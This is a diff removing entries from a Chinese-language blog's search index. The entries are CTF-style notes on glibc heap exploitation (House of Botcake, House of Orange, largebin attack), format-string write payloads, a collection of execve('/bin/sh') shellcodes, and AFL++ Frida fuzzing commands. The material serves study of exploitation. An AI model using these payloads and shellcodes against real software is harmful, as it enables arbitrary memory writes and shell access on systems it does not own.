@@ -1,34 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HeapAttack: House_of_Botcake</title>
-    <url>/2022/03/18/HeapAttack-House-of-Botcake/</url>
-    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
-<ul>
-<li>glibc版本：≥ 2.3.1</li>
-<li>Tcache：开启</li>
-<li>漏洞要求：double free</li>
-</ul>
-<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
-<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
-<p>绕过Tcache的 tcache-dup 检查，将 <code>可控chunk</code> 插入 <code>Tcache-list</code>,修改 <code>可控chunk</code> 的 <code>fd</code> 字段，从而 <strong>最终实现</strong> <code>任意地址写</code>’。</p>
-<h3 id="22-攻击过程"><a class="markdownIt-Anchor" href="#22-攻击过程"></a> 2.2 攻击过程</h3>
-<p>伪代码表示如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">size = 0x108</span><br><span class="line"></span><br><span class="line">mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunk</span><br><span class="line"></span><br><span class="line">a = malloc(size) </span><br><span class="line">b = malloc(size)  #a,b chunk是主角</span><br><span class="line"></span><br><span class="line">malloc(0x18) #和top_chunk隔离，防止forward-consolidation</span><br><span class="line"></span><br><span class="line">[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满</span><br><span class="line"></span><br><span class="line">free(a) #因tcache已满，a、b进unsorted-bin</span><br><span class="line">free(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中</span><br><span class="line"></span><br><span class="line">malloc(size) #一次分配后tcache有一个空位</span><br><span class="line">free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。</span><br><span class="line"></span><br><span class="line">c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlap</span><br><span class="line"></span><br><span class="line">payload = size * b&quot;\0&quot; + p64(size) + p64(target_address) </span><br><span class="line">#不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fd</span><br><span class="line"></span><br><span class="line">write(c, payload)  ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunk</span><br><span class="line"></span><br><span class="line">target_memory = malloc(size)</span><br><span class="line">write(target_memory, arbitrary_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考：</h3>
-<p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c">heap_exploit_2.31/house_of_botcake.c</a></p>
-]]></content>
-      <categories>
-        <category>HeapAttack</category>
-        <category>tcache</category>
-      </categories>
-      <tags>
-        <tag>HeapAttack</tag>
-        <tag>House_of_Botcake</tag>
-        <tag>tcache</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>404</title>
     <url>//404.html</url>
     <content><![CDATA[<hr />
@@ -37,259 +9,6 @@
 ]]></content>
       <tags>
         <tag>404</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HeapAttack: House_of_Orange</title>
-    <url>/2022/03/25/HeapAttack-House-of-Orange/</url>
-    <content><![CDATA[<h2 id="漏洞样式"><a class="markdownIt-Anchor" href="#漏洞样式"></a> 漏洞样式</h2>
-<ul>
-<li>漏洞要求：libc-leak， 任意地址写(_IO_list_all劫持), 大块chunk控制(伪造_IO_FILE结构)</li>
-<li>libc版本：glibc-2.3及以下</li>
-</ul>
-<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
-<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
-<ul>
-<li>GetShell：<br />
-通过劫持_IO_list_all.vtable中某函数指针，篡改为system或one_gadget, 并伪造_IO_FILE结构从而使程序在调用 _IO_flush_all_lockp 函数后能够最终调用到system或one_gadet。_IO_flush_all_lockp</li>
-</ul>
-<h3 id="22-过程简述"><a class="markdownIt-Anchor" href="#22-过程简述"></a> 2.2 过程简述</h3>
-<ul>
-<li>
-<ol>
-<li>使用unsortedbin attack，largebin attack，tcache dup、House Of Botcake等任意地址写技术将_IO_list_all改写为攻击者可控内存地址(记为fakeIOList)。</li>
-</ol>
-</li>
-<li>
-<ol start="2">
-<li>在fakeIOList上布置内存布局，使得以类型Struct _IO_File 解析fakeIOList</li>
-</ol>
-<ul>
-<li>a. fp-&gt;_mode &lt;= 0</li>
-<li>b. fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
-</ul>
-</li>
-<li>
-<ol start="3">
-<li>vtable 指向可控内存区域，修改 vtable-&gt;__overflow 为目标函数(system或者one_gadget)</li>
-</ol>
-</li>
-<li>
-<ol start="4">
-<li>[可选的]若vtable-&gt;__overflow指向system。可将fp-&gt;_flags 写成b&quot;/bin/sh\0&quot;。因为最终调用的代码是：</li>
-</ol>
-<blockquote>
-<p>_IO_OVERFLOW (fp, EOF)<br />
-即</p>
-</blockquote>
-<blockquote>
-<p>fp-&gt;vtable-&gt;__overflow(fp)</p>
-</blockquote>
-</li>
-</ul>
-<h2 id="3-注意"><a class="markdownIt-Anchor" href="#3-注意"></a> 3. 注意</h2>
-<p>参考链接(IO FILE 之劫持vtable及FSOP)中的以下两个技巧的学习：</p>
-<ol>
-<li>通过mmap 0x200000的超大chunk，该chunk会恰好分配在libc的上方，这样可以leak libc地址。</li>
-<li>当top_chunk size不够分配内存时，main_arena会sbrk新的page；若旧top_chunk的末尾地址与sbrk新分配内存的开始地址不邻接，则会把旧top_chunk free掉。我们这样就不经过free获得了一个unsortedbin chunk。</li>
-</ol>
-<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
-<ol>
-<li><a href="https://xz.aliyun.com/t/5508">IO FILE 之劫持vtable及FSOP</a></li>
-<li><a href="https://xz.aliyun.com/t/5579">IO FILE 之vtable check 以及绕过</a></li>
-<li><a href="https://www.52pojie.cn/thread-1539815-1-1.html">从零开始的Linux堆利用(七)——House of Orange</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>HeapAttack</category>
-        <category>FSOP</category>
-      </categories>
-      <tags>
-        <tag>HeapAttack</tag>
-        <tag>_IO_list_all</tag>
-        <tag>unsortedbin attack</tag>
-        <tag>FSOP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HeapAttack: LargeBin Attack</title>
-    <url>/2022/03/23/HeapAttack-LargeBinAttack/</url>
-    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
-<ul>
-<li>漏洞要求：Write After Free</li>
-<li>chunk大小：可申请 large bin(即size&gt;=0x400)</li>
-</ul>
-<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
-<h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3>
-<p>在unsorted-bin chunk被sort进large-bin时，触发<code>任意地址写</code>, 可以往<code>任意地址</code>中写入一个不可控的未知<code>大数</code> (实际为<code>某堆地址</code>)。<br />
-实现以下目的：</p>
-<ul>
-<li>修改循环次数</li>
-<li>修改global_max_fast 或arena-&gt;max_fast的值，从而把size&gt;0x80的chunk分配到fastbin中;或者在目标二进制使用mallopt(M_MXFAST,0)禁用fastbin后，重新启用</li>
-<li>修改能够输出的变量，从而泄露堆地址</li>
-</ul>
-<h3 id="22-过程简述"><a class="markdownIt-Anchor" href="#22-过程简述"></a> 2.2 过程简述</h3>
-<p>假设堆状态如下：</p>
-<pre><code>unsorted-bin: A(0x400)
-large-bin: 
-0x400： B(0x410) 
-</code></pre>
-<p>若 <strong>B</strong> 存在Write After Free, 则修改 <code>B-&gt;bk_nextsize</code> 为 <code>目标地址(target)</code> 。<br />
-触发A加入到large-bin链表中，则会导致 <code>A-&gt;bk_nextsize = B-&gt;bk_nextsize; A-&gt;bk_nextsize-&gt;fd_nextsize = B</code> 即 <code>target-&gt;fd_nextsize = A</code> 。</p>
-<p>即</p>
-<pre><code>unsorted-bin: 
-large-bin:
-0x400: B(0x410) -&gt; A(0x400) [A插入时触发攻击]
-</code></pre>
-<h3 id="23-代码表示"><a class="markdownIt-Anchor" href="#23-代码表示"></a> 2.3 代码表示</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static uint64_t target; //假设需要被更改值的目标地址</span><br><span class="line">int attack()&#123;</span><br><span class="line">    void* A, * B, * C;</span><br><span class="line"></span><br><span class="line">    A = malloc(0x400 - 8); //A小</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    B = malloc(0x410 - 8); //B大</span><br><span class="line">    malloc(0x18);</span><br><span class="line"></span><br><span class="line">    free(B);</span><br><span class="line">    // unsortedbin: B</span><br><span class="line">    // largebin: empty</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    free(A)；</span><br><span class="line">    // unsortedbin: A</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    * ( uint64_t * )(B + 0x18) = ( uint64_t ) ( &amp;target ) - 0x20</span><br><span class="line">    //edit: B-&gt;bk_nextsize = target_over  &amp;&amp; let: target_over-&gt;fd_nextsize = target</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)-&gt;A(0x400) &#123;触发：A-&gt;bk_nextsize-&gt;fd_nextsize = A&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="3-原理分析"><a class="markdownIt-Anchor" href="#3-原理分析"></a> 3. 原理分析</h2>
-<p>在glibc项目malloc.c文件_int_malloc函数中：<br />
-在chunk被从unsortedbin中sort下来之后的代码部分</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">. . . </span><br><span class="line">          /* place chunk in bin */</span><br><span class="line">          //// 若smallbin范围</span><br><span class="line">          if (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else ////若在largebin范围</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              //// largebin:: [bck]: fwd</span><br><span class="line">              /* maintain large bins in sorted order * /</span><br><span class="line">              if (fwd != bck) //// largebin不为空</span><br><span class="line">                &#123;</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">		      &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) ////确认victim为最小，因此插入到链表最后</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">                      //// largebin:: [fwd]: bck</span><br><span class="line">                      //// 等同于2节例子中：[av]: B </span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd; ////fwd-&gt;fd 即为bck,也就是例子里的B</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; //// 因此victim-&gt;bk_nextsize = bck-&gt;bk_nextsize (即A-&gt;bk_nextsize = B-&gt;bk_nextsize)</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"> ////即bck-&gt;bk_nextsize = bck-&gt;bk_nextsize-&gt;fd_nextsize = victim</span><br><span class="line"> ////即例子：B-&gt;bk_nextsize = B-&gt;bk_nextsize-&gt;fd_nextsize = A</span><br><span class="line"> ////==&gt; largebin attack的精髓即：B-&gt;bk_nextsize-&gt;fd_nextsize = A， </span><br><span class="line"> ////==&gt; 而它通过两步计算得到：victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; 和 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
-<p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/largebin_attack.c">heap_exploit_2.31/largebin_attack.c</a></p>
-]]></content>
-      <categories>
-        <category>HeapAttack</category>
-      </categories>
-      <tags>
-        <tag>HeapAttack</tag>
-        <tag>LargeBinAttack</tag>
-        <tag>Arbitrary Write</tag>
-        <tag>Write After Free</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Format-String Attack</title>
-    <url>/2022/03/18/fmtstr_attack/</url>
-    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
-<p>通常情况下漏洞程序样式：</p>
-<div align=center>Table 1. Vulnerable Code Demo</div>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char buffer[1024];</span><br><span class="line">gets(buffer, 1024);</span><br><span class="line">printf(buffer);</span><br></pre></td></tr></table></figure>
-<p>字符串 <code>buffer</code> 可控且作为 <code>printf</code> 的第一个参数。当其中包含 <code>格式化字符(例如%s, %d, %p等)</code> 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。</p>
-<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
-<h3 id="21-确定偏移"><a class="markdownIt-Anchor" href="#21-确定偏移"></a> 2.1 确定偏移</h3>
-<p>输入字符串（即Table 1中<code>buffer</code>）在栈上的偏移，即<code>buffer</code>被<code>printf</code>当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10</p>
-<ul>
-<li>步骤1. <code>break printf</code> ；即在 <code>printf</code> 下断点</li>
-<li>步骤2. 输入 <code>%p%p%p%p</code> 等特殊字符</li>
-<li>步骤3. 在  <code>printf</code> 函数断点，使用 <code>stack</code> 命令查看栈。找到 <code>%p%p%p%p</code> 特殊字符串在栈上的位置。如Figure 1所示。<br />
-<img src="https://s2.loli.net/2022/03/18/vqXDrI3Z5m4CHRE.png" alt="" /></li>
-</ul>
-<div align=center>Figure 1. printf stack illustration</div>
-<p>需注意图中①断点在<code>printf</code>入口，已跳转到<code>printf</code> 但尚未执行<code>printf</code>中指令（尤其是栈指令，否则栈布局会改变）；注意图中② <code>0b</code> 即字符串 <code>%p%p%p%p</code> 距离栈顶( <code>esp</code> )的偏移为 <code>11</code>；由于在 <code>esp + 0</code> 的位置存放函数返回地址。因此 <code>%p%p%p%p</code> 字符串实际上位于 <code>栈上</code> 第 <code>10</code> 个参数。</p>
-<ul>
-<li>步骤4. 根据不同架构确定 <code>buffer</code> 在 <code>printf</code> 函数参数的序号。参考<a href="https://www.laruence.com/2008/04/01/116.html"><code>函数调用约定</code></a>。
-<ul>
-<li>a). x86架构<br />
-x86架构的函数参数全部通过栈传递， 因此 <code>buffer</code> 是 <code>printf</code> 的第<code>10</code>个参数。</li>
-<li>b). x64架构<br />
-x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 <code>Figure 1</code> 在x64架构中，<code>buffer</code>对应的是<code>printf</code>函数的第（0xb + 6 - 1)= 16 个参数(参数序号从0开始，0，1，2，…, 16)。</li>
-</ul>
-</li>
-</ul>
-<h3 id="22-实现任意地址写"><a class="markdownIt-Anchor" href="#22-实现任意地址写"></a> 2.2 实现任意地址写</h3>
-<p>往 <code>任意目标地址(记为target_address)</code> 中写入 <code>任意值(记为target_value)</code> 。</p>
-<ul>
-<li>1). 任意值的控制：通过格式化字符串 <code>%Mc</code> 其中 <code>M=target_value</code>来操控</li>
-<li>2). 任意地址的控制：将目标地址(<code>target_address</code>)写入<code>buffer</code>字符串中；并通过格式化字符串 <code>%N$n</code>来指定将 <code>*当前printf已经输字符个数</code>* 写入到第 <code>N</code> 个参数指定的地址中。其中 <code>N</code>即为’使用<code>2.1</code>中方法确定的‘’在<code>buffer</code>字符串中的‘’<code>target_address</code>在栈上的位置对应的<code>printf</code>的参数序号‘。(该处使用’'分句停顿帮助阅读)</li>
-</ul>
-<p>例如：</p>
-<h4 id="221-当target_value-较小时直接写入"><a class="markdownIt-Anchor" href="#221-当target_value-较小时直接写入"></a> 2.2.1 当<code>target_value</code> 较小时，直接写入</h4>
-<p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）</p>
-<div align=center>Table 2. Payload Demo 1</div>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 写4到target_address</span><br><span class="line">payload1 = p32(target_address) + b&#x27;%10$n\0&#x27;</span><br></pre></td></tr></table></figure>
-<p>其中：<br />
-payload1实现写4(p32为4byte)到target_address</p>
-<div align=center>Table 3. Payload Demo 2</div>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2 = b&#x27;%100c&#x27; + b&#x27;%13$n&#x27;</span><br><span class="line">payload2 = payload2.ljust(12, b&#x27;a&#x27;)</span><br><span class="line">payload2 += p32(target_address)</span><br></pre></td></tr></table></figure>
-<p>payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13</p>
-<h4 id="222-当target_value太大时分字节写入"><a class="markdownIt-Anchor" href="#222-当target_value太大时分字节写入"></a> 2.2.2 当target_value太大时，分字节写入</h4>
-<p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向<code>target_address</code> 中写入的<code>target_value</code>为<code>*0xbaedbeef</code>*。</p>
-<pre><code>实际上就是令：
-*(int8*)target_address = 0xef = 239
-*(int8*)(target_address + 1) = 0xbe = 190
-*(int8*)(target_address + 2) = 0xed = 237
-*(int8*)(target_address + 3) = 0xba = 186
-</code></pre>
-<p>这种情况下使用 <code>%N$hhn</code> 向目标地址写入<code>int8</code>宽度值 和 使用 <code>%N$hn</code> 向目标地址写入<code>int16</code>宽度值，将会非常有用。</p>
-<p>那么可以使用如下payload实现：</p>
-<div align=center>Table 4. Payload Demo 3</div>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p32(target_address)          //arg10</span><br><span class="line">payload += p32(target_address + 1)     //arg11</span><br><span class="line">payload += p32(target_address + 2)     //arg12</span><br><span class="line">payload += p32(target_address + 3)     //arg13</span><br><span class="line">//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239</span><br><span class="line">// 186 - 16 = 170</span><br><span class="line">payload += b&quot;%170c%13$hhn&quot;</span><br><span class="line">// 190 - 186 = 4</span><br><span class="line">payload += b&quot;%4c%11$hhn&quot;</span><br><span class="line">// 237 - 190 = 47</span><br><span class="line">payload += b&quot;%47c%12$hhn&quot;</span><br><span class="line">// 239 - 237 = 2</span><br><span class="line">payload += b&quot;%2c%10$hhn&quot;</span><br></pre></td></tr></table></figure>
-<h4 id="223-使用pwnlib的fmtstr_payload函数自动构造payload"><a class="markdownIt-Anchor" href="#223-使用pwnlib的fmtstr_payload函数自动构造payload"></a> 2.2.3 使用<code>pwnlib</code>的<code>fmtstr_payload</code>函数自动构造payload</h4>
-<p>示例如下：</p>
-<div align=center>Table 5. Payload Demo 4: fmtstr_payload</div>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from pwnlib.util import misc</span><br><span class="line">//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)</span><br><span class="line">payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
-<h2 id="2-注意事项"><a class="markdownIt-Anchor" href="#2-注意事项"></a> 2. 注意事项</h2>
-<h2 id="3-原理说明"><a class="markdownIt-Anchor" href="#3-原理说明"></a> 3. 原理说明</h2>
-<p>参考：<br />
-<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmtstr_attack on ctf-wiki</a></p>
-]]></content>
-      <categories>
-        <category>Format String</category>
-      </categories>
-      <tags>
-        <tag>Format String</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Shellcode Collection</title>
-    <url>/2022/03/21/shellcode/</url>
-    <content><![CDATA[<h2 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h2>
-<p>有&quot;\x00&quot;最短 20 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
-<p>无&quot;\x00&quot;最短 21 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<h2 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h2>
-<p>最短有&quot;\x00&quot; 22 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>最短无&quot;\x00&quot; 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 31 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<h3 id="转载自"><a class="markdownIt-Anchor" href="#转载自"></a> 转载自:</h3>
-<p><a href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
-]]></content>
-      <categories>
-        <category>shellcode</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AFL++ Frida-Mode: Usecases for testing and debugging</title>
-    <url>/2022/04/07/AFL-Frida-Mode-Usecases-for-testing-and-debugging/</url>
-    <content><![CDATA[<h1 id="fuzzing"><a class="markdownIt-Anchor" href="#fuzzing"></a> Fuzzing</h1>
-<p>明确指明需要加载的<code>AFL_PRELOAD=</code>环境变量值为<code>/usr/local/lib/afl/afl-frida-trace.so</code>、且需要加载的<code>harness</code> javascript文件为<code>afl.js</code>时:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AFL_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so AFL_FRIDA_JS_SCRIPT=fuzz.js afl-fuzz -D -O -i <span class="keyword">in</span> -o out -t 10000+ -- ./build/test ./build/dummy</span><br></pre></td></tr></table></figure>
-<p>由于<code>afl-frida-trace.so</code>在<code>PATH</code>中，且<code>AFL++ Frida_Mode</code>默认寻找二进制同目录下的<code>afl.js</code>加载。因此以上可简写为：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">afl-fuzz -D -O -i <span class="keyword">in</span> -o out -t 10000+ -- ./build/test ./build/dummy</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>(注意有时在<code>persistent</code>时，有时用<code>dummy input</code>作为输入文件。以防止初始运行时找不到<code>out/default/.cur_input</code>文件而报错)</p>
-</blockquote>
-<p>当需要输出<code>forkserver</code>的子进程的以便调试时：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AFL_CHILD_DEBUG=1 afl-fuzz -O -D -i <span class="keyword">in</span> -o out -- ./build/testinstr @@</span><br></pre></td></tr></table></figure>
-<h1 id="gdb-debugging"><a class="markdownIt-Anchor" href="#gdb-debugging"></a> GDB Debugging</h1>
-<p>命令如下：</p>
-<p>Example 1: 开启<code>AFL_DEBUG_CHILD</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    --ex <span class="string">&#x27;set environment LD_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set environment AFL_FRIDA_JS_SCRIPT=afl.js&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set environment AFL_DEBUG_CHILD=1&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set disassembly-flavor intel&#x27;</span> \</span><br><span class="line">    --args ./build/testinstr ./build/in/in</span><br></pre></td></tr></table></figure>
-<p>Example 2:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    --ex <span class="string">&#x27;set environment LD_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set environment AFL_FRIDA_JS_SCRIPT=afl.js&#x27;</span> \</span><br><span class="line">    --ex <span class="string">&#x27;set disassembly-flavor intel&#x27;</span> \</span><br><span class="line">    --args ./build/testinstr ./build/in/in</span><br></pre></td></tr></table></figure>
-<h1 id="scripting"><a class="markdownIt-Anchor" href="#scripting"></a> Scripting</h1>
-<p>一个简单且方便调试的<code>harness</code>js 脚本如下</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;----------------------------------------&quot;</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;|             4x7 = 28                 |&quot;</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;----------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;pid: &quot;</span> + <span class="title class_">Process</span>.<span class="property">id</span>);</span><br><span class="line"><span class="keyword">const</span> name = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()[<span class="number">0</span>].<span class="property">name</span>;</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">`Name: <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ModuleMap</span>().<span class="title function_">values</span>().<span class="title function_">forEach</span>(<span class="function"><span class="params">m</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">`<span class="subst">$&#123;m.base&#125;</span>-<span class="subst">$&#123;m.base.add(m.size)&#125;</span> <span class="subst">$&#123;m.name&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//address of testinstr</span></span><br><span class="line"><span class="comment">// var testinstr_addr = Module.findExportByName(null, &quot;testinstr&quot;);</span></span><br><span class="line"><span class="comment">// var testinstr_addr = DebugSymbol.forName(&quot;testinstr&quot;).address;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()[<span class="number">0</span>];</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;Module.base: &quot;</span> + <span class="variable language_">module</span>.<span class="property">base</span>);</span><br><span class="line"><span class="keyword">const</span> testinstr_addr = <span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(<span class="number">0x8ca</span>);</span><br><span class="line"><span class="title class_">Afl</span>.<span class="title function_">print</span>(<span class="string">&quot;testinstr_addr: &quot;</span> + testinstr_addr);</span><br><span class="line"></span><br><span 